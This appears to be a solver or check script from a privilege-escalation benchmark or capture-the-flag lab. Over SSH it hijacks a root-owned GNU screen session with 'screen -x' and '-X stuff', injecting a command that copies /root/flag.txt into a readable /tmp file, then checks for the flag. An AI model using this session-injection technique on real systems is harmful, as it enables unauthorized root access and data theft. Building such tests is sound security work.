#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/screenflag
screen -x root/bench -p 0 -X stuff "cat /root/flag.txt > /tmp/screenflag\n"
for i in $(seq 1 30); do
  if test -r /tmp/screenflag && grep -q FLAG /tmp/screenflag 2>/dev/null; then
    cat /tmp/screenflag
    exit 0
  fi
  sleep 1
done
echo "timeout waiting for screen command" >&2
exit 1
')"
assert_root_output "${out}"
